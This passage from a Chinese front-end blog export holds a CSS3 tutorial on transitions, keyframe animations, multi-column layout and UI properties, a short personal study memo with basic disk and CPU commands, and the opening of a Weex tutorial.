<p>定义和用法<br>transition-duration 属性规定完成过渡效果需要花费的时间（以秒或毫秒计）。<br>默认值：    0<br>语法<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transition-duration</span>: <span class="selector-tag">time</span>;</span><br></pre></td></tr></table></figure></p>
<p>值|描述<br>time    规定完成过渡效果需要花费的时间（以秒或毫秒计）。默认值是 0，意味着不会有效果。</p>
<h2 id="transition-timing-function-属性"><a href="#transition-timing-function-属性" class="headerlink" title="transition-timing-function 属性"></a>transition-timing-function 属性</h2><p>以相同的速度从开始到结束的过渡效果：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition-timing-function</span>: linear;</span><br><span class="line">  <span class="attribute">-moz-transition-timing-function</span>: linear; <span class="comment">/* Firefox 4 */</span></span><br><span class="line">  <span class="attribute">-webkit-transition-timing-function</span>: linear; <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transition-timing-function</span>: linear; <span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>transition-timing-function 属性规定过渡效果的速度曲线。</p>
<p>该属性允许过渡效果随着时间来改变其速度。<br>默认值：    ease<br>语法<br>transition-timing-function: linear|ease|ease-in|ease-out|ease-in-out|cubic-<br>bezier(n,n,n,n);</p>
<p>值|描述<br>linear    规定以相同速度开始至结束的过渡效果（等于 cubic-bezier(0,0,1,1)）。<br>ease    规定慢速开始，然后变快，然后慢速结束的过渡效果（cubic-bezier(0.25,0.1,0.25,1)）。<br>ease-in    规定以慢速开始的过渡效果（等于 cubic-bezier(0.42,0,1,1)）。<br>ease-out    规定以慢速结束的过渡效果（等于 cubic-bezier(0,0,0.58,1)）。<br>ease-in-out    规定以慢速开始和结束的过渡效果（等于 cubic-bezier(0.42,0,0.58,1)）。<br>cubic-bezier(n,n,n,n)    在 cubic-bezier 函数中定义自己的值。可能的值是 0 至 1 之间的数值。</p>
<h2 id="transition-delay-属性"><a href="#transition-delay-属性" class="headerlink" title="transition-delay 属性"></a>transition-delay 属性</h2><p>在过渡效果开始前等待 2 秒：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition-delay</span>: <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-moz-transition-delay</span>: <span class="number">2s</span>; <span class="comment">/* Firefox 4 */</span></span><br><span class="line">  <span class="attribute">-webkit-transition-delay</span>: <span class="number">2s</span>; <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transition-delay</span>: <span class="number">2s</span>; <span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="定义和用法-2"><a href="#定义和用法-2" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>transition-delay 属性规定过渡效果何时开始。<br>transition-delay 值以秒或毫秒计。<br>默认值：    0</p>
<p>语法<br>transition-delay: time;</p>
<p>值|描述<br>time    规定在过渡效果开始之前需要等待的时间，以秒或毫秒计。</p>
<p>在一个例子中使用所有过渡属性：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition-property</span>: width;</span><br><span class="line">  <span class="attribute">transition-duration</span>: <span class="number">1s</span>;</span><br><span class="line">  <span class="attribute">transition-timing-function</span>: linear;</span><br><span class="line">  <span class="attribute">transition-delay</span>: <span class="number">2s</span>;</span><br><span class="line">  <span class="comment">/* Firefox 4 */</span></span><br><span class="line">  <span class="attribute">-moz-transition-property</span>:width;</span><br><span class="line">  <span class="attribute">-moz-transition-duration</span>:<span class="number">1s</span>;</span><br><span class="line">  <span class="attribute">-moz-transition-timing-function</span>:linear;</span><br><span class="line">  <span class="attribute">-moz-transition-delay</span>:<span class="number">2s</span>;</span><br><span class="line">  <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-webkit-transition-property</span>:width;</span><br><span class="line">  <span class="attribute">-webkit-transition-duration</span>:<span class="number">1s</span>;</span><br><span class="line">  <span class="attribute">-webkit-transition-timing-function</span>:linear;</span><br><span class="line">  <span class="attribute">-webkit-transition-delay</span>:<span class="number">2s</span>;</span><br><span class="line">  <span class="comment">/* Opera */</span></span><br><span class="line">  <span class="attribute">-o-transition-property</span>:width;</span><br><span class="line">  <span class="attribute">-o-transition-duration</span>:<span class="number">1s</span>;</span><br><span class="line">  <span class="attribute">-o-transition-timing-function</span>:linear;</span><br><span class="line">  <span class="attribute">-o-transition-delay</span>:<span class="number">2s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>与上面的例子相同的过渡效果，但是使用了简写的 transition 属性：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: width <span class="number">1s</span> linear <span class="number">2s</span>;</span><br><span class="line">  <span class="comment">/* Firefox 4 */</span></span><br><span class="line">  <span class="attribute">-moz-transition</span>:width <span class="number">1s</span> linear <span class="number">2s</span>;</span><br><span class="line">  <span class="comment">/* Safari and Chrome */</span></span><br><span class="line">  <span class="attribute">-webkit-transition</span>:width <span class="number">1s</span> linear <span class="number">2s</span>;</span><br><span class="line">  <span class="comment">/* Opera */</span></span><br><span class="line">  <span class="attribute">-o-transition</span>:width <span class="number">1s</span> linear <span class="number">2s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="CSS3-动画"><a href="#CSS3-动画" class="headerlink" title="CSS3 动画"></a>CSS3 动画</h1><p>通过 CSS3，我们能够创建动画，这可以在许多网页中取代动画图片、Flash 动画以及 JavaScript。</p>
<h2 id="CSS3-keyframes-规则"><a href="#CSS3-keyframes-规则" class="headerlink" title="CSS3 @keyframes 规则"></a>CSS3 @keyframes 规则</h2><p>如需在 CSS3 中创建动画，您需要学习 @keyframes 规则。<br>@keyframes 规则用于创建动画。在 @keyframes 中规定某项 CSS 样式，就能创建由当前样式逐渐改为新样式的动画效果。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> myfirst &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-moz-keyframes</span> myfirst /* Firefox */ &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> myfirst /* Safari 和 Chrome */ &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-o-keyframes</span> myfirst /* Opera */ &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CSS3-动画-1"><a href="#CSS3-动画-1" class="headerlink" title="CSS3 动画"></a>CSS3 动画</h2><p>当您在 @keyframes 中创建动画时，请把它捆绑到某个选择器，否则不会产生动画效果。<br>通过规定至少以下两项 CSS3 动画属性，即可将动画绑定到选择器：</p>
<ol>
<li>规定动画的名称</li>
<li>规定动画的时长</li>
</ol>
<p>实例<br>把 “myfirst” 动画捆绑到 div 元素，时长：5 秒：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: myfirst <span class="number">5s</span>;</span><br><span class="line">  <span class="attribute">-moz-animation</span>: myfirst <span class="number">5s</span>;	<span class="comment">/* Firefox */</span></span><br><span class="line">  <span class="attribute">-webkit-animation</span>: myfirst <span class="number">5s</span>;	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-animation</span>: myfirst <span class="number">5s</span>;	<span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注释：您必须定义动画的名称和时长。如果忽略时长，则动画不会允许，因为默认值是 0。</p>
<h2 id="什么是-CSS3-中的动画？"><a href="#什么是-CSS3-中的动画？" class="headerlink" title="什么是 CSS3 中的动画？"></a>什么是 CSS3 中的动画？</h2><p>动画是使元素从一种样式逐渐变化为另一种样式的效果。</p>
<p>您可以改变任意多的样式任意多的次数。</p>
<p>请用百分比来规定变化发生的时间，或用关键词 “from” 和 “to”，等同于 0% 和 100%。</p>
<p>0% 是动画的开始，100% 是动画的完成。</p>
<p>为了得到最佳的浏览器支持，您应该始终定义 0% 和 100% 选择器。</p>
<p>实例<br>当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> myfirst &#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: green;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-moz-keyframes</span> myfirst /* Firefox */ &#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: green;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> myfirst /* Safari 和 Chrome */ &#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: green;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-o-keyframes</span> myfirst /* Opera */ &#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: green;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>改变背景色和位置：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> myfirst &#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  75%  &#123;<span class="attribute">background</span>: green; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-moz-keyframes</span> myfirst /* Firefox */&#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  75%  &#123;<span class="attribute">background</span>: green; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> myfirst /* Safari 和 Chrome */&#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  75%  &#123;<span class="attribute">background</span>: green; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@-o-keyframes</span> myfirst /* Opera */&#123;</span><br><span class="line">  0%   &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  25%  &#123;<span class="attribute">background</span>: yellow; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">  50%  &#123;<span class="attribute">background</span>: blue; <span class="attribute">left</span>:<span class="number">200px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  75%  &#123;<span class="attribute">background</span>: green; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">200px</span>;&#125;</span><br><span class="line">  100% &#123;<span class="attribute">background</span>: red; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">top</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CSS3-动画属性-略"><a href="#CSS3-动画属性-略" class="headerlink" title="CSS3 动画属性???略"></a>CSS3 动画属性???略</h2><p>下面的表格列出了 @keyframes 规则和所有动画属性：</p>
<p>属性|描述<br>@keyframes    规定动画。<br>animation    所有动画属性的简写属性，除了 animation-play-state 属性。<br>animation-name    规定 @keyframes 动画的名称。<br>animation-duration    规定动画完成一个周期所花费的秒或毫秒。默认是 0。<br>animation-timing-function    规定动画的速度曲线。默认是 “ease”。<br>animation-delay    规定动画何时开始。默认是 0。<br>animation-iteration-count    规定动画被播放的次数。默认是 1。<br>animation-direction    规定动画是否在下一周期逆向地播放。默认是 “normal”。<br>animation-play-state    规定动画是否正在运行或暂停。默认是 “running”。<br>animation-fill-mode    规定对象动画时间之外的状态。</p>
<p>下面的两个例子设置了所有动画属性：<br>实例<br>运行名为 myfirst 的动画，其中设置了所有动画属性：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">animation-name</span>: myfirst;</span><br><span class="line">  <span class="attribute">animation-duration</span>: <span class="number">5s</span>;</span><br><span class="line">  <span class="attribute">animation-timing-function</span>: linear;</span><br><span class="line">  <span class="attribute">animation-delay</span>: <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">animation-iteration-count</span>: infinite;</span><br><span class="line">  <span class="attribute">animation-direction</span>: alternate;</span><br><span class="line">  <span class="attribute">animation-play-state</span>: running;</span><br><span class="line">  <span class="comment">/* Firefox: */</span></span><br><span class="line">  <span class="attribute">-moz-animation-name</span>: myfirst;</span><br><span class="line">  <span class="attribute">-moz-animation-duration</span>: <span class="number">5s</span>;</span><br><span class="line">  <span class="attribute">-moz-animation-timing-function</span>: linear;</span><br><span class="line">  <span class="attribute">-moz-animation-delay</span>: <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-moz-animation-iteration-count</span>: infinite;</span><br><span class="line">  <span class="attribute">-moz-animation-direction</span>: alternate;</span><br><span class="line">  <span class="attribute">-moz-animation-play-state</span>: running;</span><br><span class="line">  <span class="comment">/* Safari 和 Chrome: */</span></span><br><span class="line">  <span class="attribute">-webkit-animation-name</span>: myfirst;</span><br><span class="line">  <span class="attribute">-webkit-animation-duration</span>: <span class="number">5s</span>;</span><br><span class="line">  <span class="attribute">-webkit-animation-timing-function</span>: linear;</span><br><span class="line">  <span class="attribute">-webkit-animation-delay</span>: <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-webkit-animation-iteration-count</span>: infinite;</span><br><span class="line">  <span class="attribute">-webkit-animation-direction</span>: alternate;</span><br><span class="line">  <span class="attribute">-webkit-animation-play-state</span>: running;</span><br><span class="line">  <span class="comment">/* Opera: */</span></span><br><span class="line">  <span class="attribute">-o-animation-name</span>: myfirst;</span><br><span class="line">  <span class="attribute">-o-animation-duration</span>: <span class="number">5s</span>;</span><br><span class="line">  <span class="attribute">-o-animation-timing-function</span>: linear;</span><br><span class="line">  <span class="attribute">-o-animation-delay</span>: <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-o-animation-iteration-count</span>: infinite;</span><br><span class="line">  <span class="attribute">-o-animation-direction</span>: alternate;</span><br><span class="line">  <span class="attribute">-o-animation-play-state</span>: running;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>与上面的动画相同，但是使用了简写的动画 animation 属性：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: myfirst <span class="number">5s</span> linear <span class="number">2s</span> infinite alternate;</span><br><span class="line">  <span class="comment">/* Firefox: */</span></span><br><span class="line">  <span class="attribute">-moz-animation</span>: myfirst <span class="number">5s</span> linear <span class="number">2s</span> infinite alternate;</span><br><span class="line">  <span class="comment">/* Safari 和 Chrome: */</span></span><br><span class="line">  <span class="attribute">-webkit-animation</span>: myfirst <span class="number">5s</span> linear <span class="number">2s</span> infinite alternate;</span><br><span class="line">  <span class="comment">/* Opera: */</span></span><br><span class="line">  <span class="attribute">-o-animation</span>: myfirst <span class="number">5s</span> linear <span class="number">2s</span> infinite alternate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="CSS3-多列"><a href="#CSS3-多列" class="headerlink" title="CSS3 多列"></a>CSS3 多列</h1><p>通过 CSS3，您能够创建多个列来对文本进行布局 - 就像报纸那样！<br>在本章中，您将学习如下多列属性：</p>
<ol>
<li>column-count</li>
<li>column-gap</li>
<li>column-rule<h2 id="CSS3-创建多列"><a href="#CSS3-创建多列" class="headerlink" title="CSS3 创建多列"></a>CSS3 创建多列</h2>column-count 属性规定元素应该被分隔的列数：<br>把 div 元素中的文本分隔为三列：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">-moz-column-count</span>:<span class="number">3</span>; 	<span class="comment">/* Firefox */</span></span><br><span class="line">  <span class="attribute">-webkit-column-count</span>:<span class="number">3</span>; <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">column-count</span>:<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="CSS3-规定列之间的间隔"><a href="#CSS3-规定列之间的间隔" class="headerlink" title="CSS3 规定列之间的间隔"></a>CSS3 规定列之间的间隔</h2><p>column-gap 属性规定列之间的间隔：<br>规定列之间 40 像素的间隔：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">-moz-column-gap</span>:<span class="number">40px</span>;		<span class="comment">/* Firefox */</span></span><br><span class="line">  <span class="attribute">-webkit-column-gap</span>:<span class="number">40px</span>;	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">column-gap</span>:<span class="number">40px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CSS3-列规则"><a href="#CSS3-列规则" class="headerlink" title="CSS3 列规则"></a>CSS3 列规则</h2><p>column-rule 属性设置列之间的宽度、样式和颜色规则。<br>实例<br>规定列之间的宽度、样式和颜色规则：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">-moz-column-rule</span>:<span class="number">3px</span> outset <span class="number">#ff0000</span>;	<span class="comment">/* Firefox */</span></span><br><span class="line">  <span class="attribute">-webkit-column-rule</span>:<span class="number">3px</span> outset <span class="number">#ff0000</span>;	<span class="comment">/* Safari and Chrome */</span></span><br><span class="line">  <span class="attribute">column-rule</span>:<span class="number">3px</span> outset <span class="number">#ff0000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="新的多列属性-略"><a href="#新的多列属性-略" class="headerlink" title="新的多列属性???略"></a>新的多列属性???略</h2><p>下面的表格列出了所有的转换属性：<br>属性|描述<br>column-count    规定元素应该被分隔的列数。<br>column-fill    规定如何填充列。<br>column-gap    规定列之间的间隔。<br>column-rule    设置所有 column-rule-* 属性的简写属性。<br>column-rule-color    规定列之间规则的颜色。<br>column-rule-style    规定列之间规则的样式。<br>column-rule-width    规定列之间规则的宽度。<br>column-span    规定元素应该横跨的列数。<br>column-width    规定列的宽度。<br>columns    规定设置 column-width 和 column-count 的简写属性。</p>
<h1 id="CSS3-用户界面"><a href="#CSS3-用户界面" class="headerlink" title="CSS3 用户界面"></a>CSS3 用户界面</h1><p>在 CSS3 中，新的用户界面特性包括重设元素尺寸、盒尺寸以及轮廓等。</p>
<p>在本章中，您将学到以下用户界面属性：</p>
<ol>
<li>resize</li>
<li>box-sizing</li>
<li>outline-offset<h2 id="CSS3-Resizing"><a href="#CSS3-Resizing" class="headerlink" title="CSS3 Resizing"></a>CSS3 Resizing</h2>在 CSS3，resize 属性规定是否可由用户调整元素尺寸。</li>
</ol>
<p>实例<br>规定 div 元素可由用户调整大小：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">resize</span>:both;</span><br><span class="line">  <span class="attribute">overflow</span>:auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CSS3-Box-Sizing"><a href="#CSS3-Box-Sizing" class="headerlink" title="CSS3 Box Sizing"></a>CSS3 Box Sizing</h2><p>box-sizing 属性允许您以确切的方式定义适应某个区域的具体内容。</p>
<p>实例<br>规定两个并排的带边框方框：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>:border-box;</span><br><span class="line">  <span class="attribute">-moz-box-sizing</span>:border-box;	<span class="comment">/* Firefox */</span></span><br><span class="line">  <span class="attribute">-webkit-box-sizing</span>:border-box;	<span class="comment">/* Safari */</span></span><br><span class="line">  <span class="attribute">width</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">float</span>:left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CSS3-Outline-Offset"><a href="#CSS3-Outline-Offset" class="headerlink" title="CSS3 Outline Offset"></a>CSS3 Outline Offset</h2><p>outline-offset 属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。<br>轮廓与边框有两点不同：</p>
<ol>
<li>轮廓不占用空间</li>
<li>轮廓可能是非矩形</li>
</ol>
<p>实例<br>规定边框边缘之外 15 像素处的轮廓：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">2px</span> solid black;</span><br><span class="line">  <span class="attribute">outline</span>:<span class="number">2px</span> solid red;</span><br><span class="line">  <span class="attribute">outline-offset</span>:<span class="number">15px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="新的用户界面属性-略"><a href="#新的用户界面属性-略" class="headerlink" title="新的用户界面属性???略"></a>新的用户界面属性???略</h2><p>下面的表格列出了所有的转换属性：<br>属性 | 描述<br>appearance    允许您将元素设置为标准用户界面元素的外观<br>box-sizing    允许您以确切的方式定义适应某个区域的具体内容。<br>icon    为创作者提供使用图标化等价物来设置元素样式的能力。<br>nav-down    规定在使用 arrow-down 导航键时向何处导航。<br>nav-index    设置元素的 tab 键控制次序。<br>nav-left    规定在使用 arrow-left 导航键时向何处导航。<br>nav-right    规定在使用 arrow-right 导航键时向何处导航。<br>nav-up    规定在使用 arrow-up 导航键时向何处导航。<br>outline-offset    对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。<br>resize    规定是否可由用户对元素的尺寸进行调整。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css3</tag>
      </tags>
  </entry>
  <entry>
    <title>备忘录</title>
    <url>/2019/10/10/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<p>备忘录<br><a id="more"></a><br>微信公众号<br>css3<br>网络安全<br>react key</p>
<p>系统基础知识<br>react需要深入学习<br>vue需要学习<br>小程序、移动端、有余力再学习app端<br>把每个方向的知识点都学得巩固一些</p>
<p>隐式类型转换<br>redux源码</p>
<p>查看磁盘占用空间<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">du -sh *</span><br><span class="line">sudo df -h</span><br></pre></td></tr></table></figure></p>
<p>查看cpu和内存<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure></p>
<p>爬虫ip</p>
<h2 id="react-hook"><a href="#react-hook" class="headerlink" title="react hook"></a>react hook</h2><h2 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h2><p>使用说明：<br>点击按钮即可上传图片。免费支持图片云存储、在线查看、下载等服务。</p>
<p>存储可靠性：</p>
<ol>
<li>所有图片都存储在阿里云服务器上，开发者及域名均有备案。</li>
<li>目前收益已能够补偿服务器开销，服务会永久维护。</li>
</ol>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>weex教程(未完成)</title>
    <url>/2019/07/17/weex%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>参考:<br><a href="https://weex.apache.org/zh/guide/introduction.html" target="_blank" rel="noopener">week官方文档</a></p>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Weex 是使用流行的 Web 开发体验来开发高性能原生应用的框架。</p>
<p>Weex 致力于使开发者能基于通用跨平台的 Web 开发语言和开发经验，来构建 Android、iOS 和 Web 应用。简单来说，在集成了 WeexSDK 之后，你可以使用 JavaScript 语言和前端开发经验来开发移动应用。</p>
<p>Weex 渲染引擎与 DSL 语法层是分开的，Weex 并不强依赖任何特定的前端框架。目前 Vue.js 和 Rax 这两个前端框架被广泛应用于 Weex 页面开发，同时 Weex 也对这两个前端框架提供了最完善的支持。Weex 的另一个主要目标是跟进流行的 Web 开发技术并将其和原生开发的技术结合，实现开发效率和运行性能的高度统一。在开发阶段，一个 Weex 页面就像开发普通网页一样；在运行时，Weex 页面又充分利用了各种操作系统的原生组件和能力。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>想初步了解 Weex 其实非常简单。</p>
<ol>
<li>安装<a href="https://weex.apache.org/tools/playground.html?spm=a2c7j.-zh-guide-introduction.0.0.1608c8eeCx4kPE" target="_blank" rel="noopener">WeexPlayground</a>,在 Playground 里，你可以打开各种示例。</li>
<li>访问 <a href="http://dotwe.org/vue?spm=a2c7j.-zh-guide-introduction.0.0.1608c8eeCx4kPE" target="_blank" rel="noopener">Weex online playground</a>. 在这个网站上，你可以浏览、修改、新建各种基于 Vue.js 的单页面例子，并用 WeexPlayground 应用扫码查看实时效果。</li>
</ol>
<p>这里有一个使用 Weex 和 Vue.js 开发的最简单的例子。你可以大致了解 Weex 是如何工作的。</p>
